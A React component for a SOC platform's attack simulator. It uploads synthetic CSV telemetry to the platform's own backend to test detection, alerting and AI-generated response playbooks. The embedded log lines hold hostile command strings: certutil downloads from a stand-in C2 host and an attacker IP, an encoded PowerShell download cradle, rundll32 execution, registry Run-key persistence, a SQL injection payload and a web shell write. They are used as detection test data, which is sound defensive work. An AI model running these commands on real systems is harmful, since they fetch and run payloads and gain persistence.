import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  Crosshair,
  Play,
  CheckCircle2,
  Terminal,
  ShieldAlert,
  ArrowRight,
  Flame,
  Gauge,
  Radio,
  Sparkles,
  Server,
  Laptop,
  AlertTriangle,
  RefreshCw,
} from "lucide-react";
import { api } from "../services/api";
import { useToast } from "../components/common/Toast";
import { CyberGridBackground } from "../components/common/CyberGridBackground";
import { SOCPageHeader } from "../components/common/SOCPageHeader";
import { SOCButton } from "../components/common/SOCButton";

interface AttackScenario {
  id: string;
  name: string;
  threatActor: string;
  severity: "critical" | "high" | "medium";
  category: string;
  tactic: string;
  technique: string;
  description: string;
  sourceIp: string;
  targetHost: string;
  targetUser: string;
  filename: string;
  logSource: "endpoint" | "firewall" | "ids_ips" | "application";
  logPayload: string;
}

const ATTACK_SCENARIOS: AttackScenario[] = [
  {
    id: "apt29-lolbins",
    name: "APT29 (Cozy Bear) — LOLBins & Ingress Tool Transfer",
    threatActor: "APT29 / Nobelium",
    severity: "high",
    category: "Endpoint Living-off-the-Land",
    tactic: "TA0002 — Execution & Ingress",
    technique: "T1105 (Ingress Tool Transfer) & T1059 (Command Interpreter)",
    description: "Adversary leverages native Windows certutil.exe to download staged C2 binaries and execute via hidden PowerShell.",
    sourceIp: "198.51.100.99",
    targetHost: "WIN-WORKSTATION-01",
    targetUser: "Administrator",
    filename: "apt29_lolbins_telemetry.csv",
    logSource: "endpoint",
    logPayload: `timestamp,hostname,username,source_ip,destination_ip,destination_port,event_type,action,message
${new Date().toISOString()},WIN-WORKSTATION-01,Administrator,10.0.1.45,198.51.100.99,443,cmd_exec,allowed,cmd.exe /c certutil.exe -urlcache -split -f http://c2-cozybear.org/svchost.exe %TEMP%\\svchost.exe
${new Date(Date.now() + 5000).toISOString()},WIN-WORKSTATION-01,Administrator,10.0.1.45,198.51.100.99,443,powershell,allowed,powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=
${new Date(Date.now() + 10000).toISOString()},WIN-WORKSTATION-01,SYSTEM,10.0.1.45,10.0.1.1,445,wmic_exec,allowed,wmic process call create "rundll32.exe C:\\Windows\\Temp\\svchost.exe,EntryPoint"
${new Date(Date.now() + 15000).toISOString()},WIN-WORKSTATION-01,SYSTEM,10.0.1.45,10.0.1.1,445,registry_mod,allowed,reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /t REG_SZ /d C:\\Windows\\Temp\\svchost.exe /f`,
  },
  {
    id: "auth-brute-force",
    name: "Multi-Threaded SSH / RDP Credential Bombardment",
    threatActor: "Automated Botnet / FIN7",
    severity: "medium",
    category: "Identity & Credential Access",
    tactic: "TA0006 — Credential Access",
    technique: "T1110 (Brute Force: Password Guessing)",
    description: "High-frequency dictionary attack attempting automated credential guessing across corporate SSH/RDP jumpboxes.",
    sourceIp: "185.220.101.5",
    targetHost: "LINUX-EDGE-GATEWAY",
    targetUser: "root",
    filename: "ssh_bruteforce_telemetry.csv",
    logSource: "firewall",
    logPayload: `timestamp,hostname,username,source_ip,destination_ip,destination_port,event_type,action,message
${new Date().toISOString()},LINUX-EDGE-GATEWAY,root,185.220.101.5,10.0.0.15,22,ssh_login,denied,Failed password for root from 185.220.101.5 port 42391 ssh2
${new Date(Date.now() + 1000).toISOString()},LINUX-EDGE-GATEWAY,root,185.220.101.5,10.0.0.15,22,ssh_login,denied,Failed password for root from 185.220.101.5 port 42392 ssh2
${new Date(Date.now() + 2000).toISOString()},LINUX-EDGE-GATEWAY,admin,185.220.101.5,10.0.0.15,22,ssh_login,denied,Failed password for admin from 185.220.101.5 port 42393 ssh2
${new Date(Date.now() + 3000).toISOString()},LINUX-EDGE-GATEWAY,support,185.220.101.5,10.0.0.15,22,ssh_login,denied,Failed password for support from 185.220.101.5 port 42394 ssh2
${new Date(Date.now() + 4000).toISOString()},LINUX-EDGE-GATEWAY,root,185.220.101.5,10.0.0.15,22,ssh_login,denied,Failed password for root from 185.220.101.5 port 42395 ssh2`,
  },
  {
    id: "webshell-sqli",
    name: "Web Application SQL Injection & C2 Web Shell Deployment",
    threatActor: "Lazarus Group / APT38",
    severity: "critical",
    category: "Web Application Exploitation",
    tactic: "TA0001 — Initial Access & Persistence",
    technique: "T1190 (Exploit Public-Facing App) & T1505.003 (Web Shell)",
    description: "Adversary exploits SQL injection vulnerability to drop ASPX web shell and initiate reverse shell socket connection.",
    sourceIp: "203.0.113.88",
    targetHost: "PROD-DMZ-WEB01",
    targetUser: "w3wp_service",
    filename: "web_exploit_telemetry.csv",
    logSource: "application",
    logPayload: `timestamp,hostname,username,source_ip,destination_ip,destination_port,event_type,action,message
${new Date().toISOString()},PROD-DMZ-WEB01,w3wp_service,203.0.113.88,10.0.2.20,443,http_request,allowed,POST /api/v1/query HTTP/1.1 500 query=' UNION SELECT 1,username,password FROM users--
${new Date(Date.now() + 4000).toISOString()},PROD-DMZ-WEB01,w3wp_service,203.0.113.88,10.0.2.20,443,cmd_exec,allowed,cmd.exe /c echo "<%@ Page Language=\"C#\" %>" > C:\\inetpub\\wwwroot\\shell.aspx
${new Date(Date.now() + 8000).toISOString()},PROD-DMZ-WEB01,w3wp_service,203.0.113.88,10.0.2.20,443,cmd_exec,allowed,cmd.exe /c whoami /all
${new Date(Date.now() + 12000).toISOString()},PROD-DMZ-WEB01,SYSTEM,10.0.2.20,203.0.113.88,443,cmd_exec,allowed,cmd.exe /c certutil.exe -urlcache -split -f http://203.0.113.88/stage2.exe C:\\temp\\stage2.exe`,
  },
];

export const AttackSimulator: React.FC = () => {
  const [selectedScenario, setSelectedScenario] = useState<AttackScenario>(ATTACK_SCENARIOS[0]);
  const [isRunning, setIsRunning] = useState(false);
  const [activeStep, setActiveStep] = useState<number>(0);
  const [terminalLogs, setTerminalLogs] = useState<Array<{ text: string; status: "info" | "success" | "warn" }>>([]);
  const [simulationResult, setSimulationResult] = useState<any | null>(null);

  const navigate = useNavigate();
  const { success, error: toastError } = useToast();

  const addLog = (text: string, status: "info" | "success" | "warn" = "info") => {
    setTerminalLogs((prev) => [...prev, { text, status }]);
  };

  const handleLaunchSimulation = async () => {
    setIsRunning(true);
    setActiveStep(1);
    setTerminalLogs([]);
    setSimulationResult(null);

    try {
      addLog(`[SIMULATOR INIT]: Initializing adversary emulation campaign: "${selectedScenario.name}"...`, "info");
      addLog(`[STAGE 1/7]: Uploading synthetic adversarial telemetry to SOC Ingestion Gateway...`, "info");

      // 1. Upload File
      const blob = new Blob([selectedScenario.logPayload], { type: "text/csv" });
      const formData = new FormData();
      formData.append("file", blob, selectedScenario.filename);
      formData.append("log_source", selectedScenario.logSource);

      const uploadRes = await api.post("/logs/upload", formData, {
        headers: { "Content-Type": "multipart/form-data" },
      });
      const logId = uploadRes.data?.data?.id;
      if (!logId) throw new Error("Log upload returned invalid ID.");
      addLog(`[STAGE 1/7 COMPLETE]: Ingested security log blob (ID: ${logId.slice(0, 8)}...)`, "success");

      // 2. Parse Log
      setActiveStep(2);
      addLog(`[STAGE 2/7]: Normalizing raw logs into ParsedLog events & extracting telemetry entities...`, "info");
      const parseRes = await api.post(`/logs/${logId}/parse`);
      const entriesCreated = parseRes.data?.data?.entries_created || 0;
      if (entriesCreated === 0) throw new Error("Parser produced 0 events from telemetry.");
      addLog(`[STAGE 2/7 COMPLETE]: Normalized ${entriesCreated} security event records into database.`, "success");

      // 3. Sigma Detection Scan
      setActiveStep(3);
      addLog(`[STAGE 3/7]: Executing Sigma AST Engine across active YAML detection rule catalogue...`, "info");
      const detRes = await api.post(`/detections/run-file/${logId}`);
      const detectionsCreated = detRes.data?.data?.detections_created || 0;
      addLog(`[STAGE 3/7 COMPLETE]: Sigma Rule Engine evaluated ${detRes.data?.data?.events_scanned || entriesCreated} events. Flagged ${detectionsCreated} malicious matches!`, "success");

      // 4. Deterministic Risk Assessment
      setActiveStep(4);
      addLog(`[STAGE 4/7]: Computing explainable 0–100 risk scores combining MITRE weights & asset context...`, "info");
      const riskRes = await api.post("/risk/assess-batch");
      const assessedCount = riskRes.data?.data?.assessed_count || 0;
      const avgScore = riskRes.data?.data?.average_score || 0;
      addLog(`[STAGE 4/7 COMPLETE]: Evaluated ${assessedCount} detections (Average Composite Score: ${avgScore}/100).`, "success");

      // 5. Alert Auto-Generation
      setActiveStep(5);
      addLog(`[STAGE 5/7]: Promoting evaluated risk assessments to Alert triage queue...`, "info");
      const alertRes = await api.post("/alerts/auto-generate");
      const alertsCreated = alertRes.data?.data?.alerts_created || 0;
      addLog(`[STAGE 5/7 COMPLETE]: Successfully dispatched ${alertsCreated} high-priority SOC alerts.`, "success");

      // 6. Automated Incident Correlation
      setActiveStep(6);
      addLog(`[STAGE 6/7]: Auto-correlating alerts into unified incident investigation dossier...`, "info");
      const incRes = await api.post("/incidents/auto-correlate");
      const incidentsCreated = incRes.data?.data?.incidents_created || 0;
      addLog(`[STAGE 6/7 COMPLETE]: ${incRes.data?.data?.message || `Consolidated alerts into ${incidentsCreated} incident(s).`}`, "success");

      // Fetch newest incident
      const latestIncRes = await api.get("/incidents?limit=1");
      const latestIncident = latestIncRes.data?.data?.[0];
      if (!latestIncident) throw new Error("No incident was generated from correlation.");

      // 7. AI Threat Intelligence & Playbook Synthesis
      setActiveStep(7);
      addLog(`[STAGE 7/7]: Engaging AI Threat Hunter to synthesize attack narrative & containment playbook for Incident ${latestIncident.incident_number}...`, "info");
      const aiRes = await api.post(`/ai/analyze/incident/${latestIncident.id}`);
      const aiData = aiRes.data?.data;
      addLog(`[STAGE 7/7 COMPLETE]: AI Threat Hunter synthesized response playbook with ${aiData?.recommended_actions?.length || 0} prescribed containment actions.`, "success");

      setSimulationResult({
        logId,
        entriesCreated,
        detectionsCreated,
        avgScore,
        alertsCreated,
        incident: latestIncident,
        aiAnalysis: aiData,
      });

      success("Adversary attack campaign simulated & response playbook synthesized!");
    } catch (err: any) {
      const errMsg = err.response?.data?.message || err.message || "Unknown error";
      addLog(`[SIMULATION FAILED at Stage ${activeStep}]: ${errMsg}`, "warn");
      toastError(`Simulation failed at Stage ${activeStep}: ${errMsg}`);
    } finally {
      setIsRunning(false);
    }
  };

  return (
    <div className="relative min-h-[calc(100vh-5.5rem)] -m-4 sm:-m-6 p-4 sm:p-6 overflow-hidden">
      <CyberGridBackground variant="simulator" />

      {/* Foreground Content Container (Isolated z-10) */}
      <div className="relative z-10 space-y-6 text-slate-200">
        {/* Header */}
      <SOCPageHeader
        title="Attack Simulator"
        tagline="ADVERSARY EMULATION & VALIDATION"
        subtitle="Controlled synthetic attack telemetry and SOC pipeline validation."
        icon={Crosshair}
        badgeText="Interactive Cyber Range"
        actions={
          <SOCButton
            variant="danger"
            onClick={handleLaunchSimulation}
            disabled={isRunning}
            icon={<Play className={`w-4 h-4 fill-current ${isRunning ? "animate-spin" : ""}`} />}
            glow
          >
            {isRunning ? "Simulating Attack Pipeline..." : "Launch Attack Simulation"}
          </SOCButton>
        }
      />

      {/* Campaign Selector Grid */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
        {ATTACK_SCENARIOS.map((scenario) => {
          const isSelected = selectedScenario.id === scenario.id;
          return (
            <div
              key={scenario.id}
              onClick={() => !isRunning && setSelectedScenario(scenario)}
              className={`p-5 rounded-xl border transition-all cursor-pointer flex flex-col justify-between cyber-panel ${
                isSelected
                  ? "bg-slate-900/90 border-red-500/80 shadow-lg shadow-red-950/40 ring-1 ring-red-500/50 scale-[1.01]"
                  : "bg-[#061226]/80 border-slate-800/80 hover:border-cyan-500/40 hover:bg-[#081a38]/80 opacity-85 hover:opacity-100"
              }`}
            >
              <div>
                <div className="flex items-center justify-between mb-2">
                  <span
                    className={`px-2 py-0.5 rounded text-[10px] font-black uppercase tracking-wider ${
                      scenario.severity === "critical"
                        ? "bg-red-950 text-red-400 border border-red-800"
                        : scenario.severity === "high"
                        ? "bg-orange-950 text-orange-400 border border-orange-800"
                        : "bg-yellow-950 text-yellow-400 border border-yellow-800"
                    }`}
                  >
                    {scenario.severity} severity
                  </span>
                  <span className="text-[11px] font-mono text-slate-500">{scenario.threatActor}</span>
                </div>
                <h3 className="text-sm font-bold text-white mb-1.5">{scenario.name}</h3>
                <p className="text-xs text-slate-400 leading-relaxed line-clamp-2">
                  {scenario.description}
                </p>
              </div>

              <div className="mt-4 pt-3 border-t border-slate-800/80 text-[11px] font-mono space-y-1 text-slate-400">
                <div className="flex justify-between">
                  <span>Target:</span>
                  <span className="text-cyan-400 font-semibold">{scenario.targetHost}</span>
                </div>
                <div className="flex justify-between">
                  <span>Adversary IP:</span>
                  <span className="text-red-400 font-semibold">{scenario.sourceIp}</span>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* Target Topology & Vector Preview */}
      <div className="cyber-panel p-6">
        <h2 className="text-sm font-bold uppercase tracking-wider text-cyan-300 flex items-center gap-2 mb-4">
          <Radio className="w-4 h-4 text-cyan-400 animate-pulse" />
          Active Campaign Topology & Attack Vector
        </h2>

        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4 items-center">
          <div className="p-4 rounded-xl bg-[#030a18]/90 border border-red-500/30 text-center shadow-inner">
            <ShieldAlert className="w-6 h-6 text-red-400 mx-auto mb-2" />
            <span className="text-[10px] uppercase font-bold text-red-400 tracking-wider">Adversary Source</span>
            <p className="text-xs font-mono font-bold text-white mt-1">{selectedScenario.sourceIp}</p>
            <p className="text-[10px] text-slate-400 mt-0.5">{selectedScenario.threatActor}</p>
          </div>

          <div className="hidden sm:flex flex-col items-center justify-center text-center">
            <span className="text-[10px] font-mono text-cyan-400/80 uppercase tracking-widest mb-1">
              {selectedScenario.technique}
            </span>
            <div className="w-full h-0.5 bg-gradient-to-r from-red-500 via-amber-500 to-cyan-500 relative">
              <div className="w-2 h-2 rounded-full bg-cyan-400 absolute right-0 -top-[3px] animate-ping" />
            </div>
            <span className="text-[10px] text-cyan-400 font-mono mt-1">C2 Payload Delivery</span>
          </div>

          <div className="p-4 rounded-xl bg-[#030a18]/90 border border-cyan-500/30 text-center shadow-inner">
            <Laptop className="w-6 h-6 text-cyan-400 mx-auto mb-2" />
            <span className="text-[10px] uppercase font-bold text-cyan-400 tracking-wider">Target Endpoint</span>
            <p className="text-xs font-mono font-bold text-white mt-1">{selectedScenario.targetHost}</p>
            <p className="text-[10px] text-slate-400 mt-0.5">User: {selectedScenario.targetUser}</p>
          </div>

          <div className="p-4 rounded-xl bg-[#030a18]/90 border border-slate-800 text-xs space-y-2">
            <div>
              <span className="text-slate-400 text-[10px] block uppercase tracking-wider">MITRE ATT&CK:</span>
              <span className="font-mono text-slate-200 font-semibold">{selectedScenario.tactic}</span>
            </div>
            <div>
              <span className="text-slate-400 text-[10px] block uppercase tracking-wider">Detection Target:</span>
              <span className="font-mono text-emerald-400 font-semibold">{selectedScenario.category}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Execution Pipeline Stepper */}
      <div className="cyber-panel p-6">
        <h2 className="text-sm font-bold uppercase tracking-wider text-slate-200 mb-4 flex items-center gap-2">
          <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse" />
          Autonomous SOC Pipeline Execution Stages
        </h2>

        <div className="grid grid-cols-2 sm:grid-cols-7 gap-2 text-center">
          {[
            { step: 1, title: "1. Log Ingest", desc: "Ingest CSV/JSON" },
            { step: 2, title: "2. Normalization", desc: "ParsedLog extract" },
            { step: 3, title: "3. Sigma Match", desc: "AST engine" },
            { step: 4, title: "4. Risk Scoring", desc: "0–100 composite" },
            { step: 5, title: "5. Alert Dispatch", desc: "Triage queue" },
            { step: 6, title: "6. Case Correlate", desc: "Incident created" },
            { step: 7, title: "7. AI Playbook", desc: "Response actions" },
          ].map((s) => {
            const isDone = activeStep > s.step;
            const isCurrent = activeStep === s.step;
            return (
              <div
                key={s.step}
                className={`p-3 rounded-xl border text-xs transition-all ${
                  isDone
                    ? "bg-emerald-950/40 border-emerald-500/50 text-emerald-300"
                    : isCurrent
                    ? "bg-cyan-950/60 border-cyan-400 text-cyan-200 shadow-md shadow-cyan-950/40 ring-1 ring-cyan-400 animate-pulse"
                    : "bg-[#030a18]/60 border-slate-800 text-slate-500"
                }`}
              >
                <div className="font-bold flex items-center justify-center gap-1.5 mb-1">
                  {isDone ? (
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                  ) : (
                    <span>Step {s.step}</span>
                  )}
                </div>
                <div className="text-[11px] font-semibold text-white">{s.title}</div>
                <div className="text-[10px] opacity-75">{s.desc}</div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Terminal Live Output & Results Dossier */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Terminal Output */}
        <div className="lg:col-span-2 bg-[#020712]/95 border border-cyan-900/40 rounded-xl p-5 font-mono text-xs shadow-2xl backdrop-blur-md">
          <div className="flex items-center justify-between pb-3 mb-3 border-b border-slate-800">
            <div className="flex items-center gap-2 text-cyan-300">
              <Terminal className="w-4 h-4 text-cyan-400" />
              <span className="font-semibold tracking-wide">SOC Engine Execution Console</span>
            </div>
            <div className="flex items-center gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
              <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
              <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
            </div>
          </div>

          <div className="h-64 overflow-y-auto space-y-1.5 pr-2 font-mono">
            {terminalLogs.length === 0 ? (
              <p className="text-slate-500 text-center py-20">
                Awaiting campaign execution. Click "Launch Attack Simulation" to observe real-time telemetry processing.
              </p>
            ) : (
              terminalLogs.map((log, i) => (
                <div
                  key={i}
                  className={`leading-relaxed ${
                    log.status === "success"
                      ? "text-emerald-400 font-semibold"
                      : log.status === "warn"
                      ? "text-red-400 font-bold"
                      : "text-slate-300"
                  }`}
                >
                  {log.text}
                </div>
              ))
            )}
          </div>
        </div>

        {/* Results Card */}
        <div className="cyber-panel p-6 flex flex-col justify-between">
          <div>
            <h3 className="text-sm font-bold text-white flex items-center gap-2 mb-3">
              <Sparkles className="w-4 h-4 text-cyan-400" />
              Campaign Outcome Telemetry
            </h3>

            {simulationResult ? (
              <div className="space-y-3 text-xs">
                <div className="p-3 bg-[#030a18]/90 rounded-xl border border-slate-800 flex items-center justify-between">
                  <span className="text-slate-400">Events Parsed:</span>
                  <span className="font-mono font-bold text-white">{simulationResult.entriesCreated}</span>
                </div>
                <div className="p-3 bg-[#030a18]/90 rounded-xl border border-slate-800 flex items-center justify-between">
                  <span className="text-slate-400">Sigma Matches:</span>
                  <span className="font-mono font-bold text-emerald-400">+{simulationResult.detectionsCreated} Rule Hits</span>
                </div>
                <div className="p-3 bg-[#030a18]/90 rounded-xl border border-slate-800 flex items-center justify-between">
                  <span className="text-slate-400">Composite Risk:</span>
                  <span className="font-mono font-bold text-amber-400">{simulationResult.avgScore} / 100</span>
                </div>
                <div className="p-3 bg-[#030a18]/90 rounded-xl border border-slate-800 flex items-center justify-between">
                  <span className="text-slate-400">Alerts Created:</span>
                  <span className="font-mono font-bold text-cyan-400">+{simulationResult.alertsCreated} Alerts</span>
                </div>

                {simulationResult.incident && (
                  <div className="p-4 bg-cyan-950/40 border border-cyan-500/40 rounded-xl space-y-2 mt-4 shadow-lg shadow-cyan-950/30">
                    <div className="flex items-center justify-between">
                      <span className="text-[10px] uppercase font-bold text-cyan-300">Correlated Incident:</span>
                      <span className="px-2 py-0.5 rounded bg-cyan-500 text-slate-950 font-bold font-mono text-[11px]">
                        {simulationResult.incident.incident_number}
                      </span>
                    </div>
                    <p className="text-xs font-semibold text-white leading-tight">
                      {simulationResult.incident.title || `Investigation Case ${simulationResult.incident.incident_number}`}
                    </p>

                    {simulationResult.aiAnalysis && (
                      <div className="pt-2 border-t border-cyan-800/40 space-y-1.5">
                        <span className="text-[10px] font-bold text-cyan-300 uppercase tracking-wider block">
                          AI Prescribed Actions ({simulationResult.aiAnalysis.recommended_actions?.length || 0}):
                        </span>
                        <ul className="list-disc pl-4 space-y-1 text-[11px] text-slate-300">
                          {(simulationResult.aiAnalysis.recommended_actions || []).slice(0, 3).map((act: string, idx: number) => (
                            <li key={idx}>{act}</li>
                          ))}
                        </ul>
                      </div>
                    )}
                  </div>
                )}
              </div>
            ) : (
              <div className="py-12 text-center text-slate-500 text-xs">
                Run an attack scenario to observe end-to-end incident generation metrics.
              </div>
            )}
          </div>

          {simulationResult?.incident && (
            <SOCButton
              variant="primary"
              className="mt-4 w-full"
              onClick={() => navigate(`/incidents/${simulationResult.incident.id}`)}
              icon={<ArrowRight className="w-4 h-4" />}
            >
              Investigate Incident Case
            </SOCButton>
          )}
        </div>
      </div>
      </div>
    </div>
  );
};
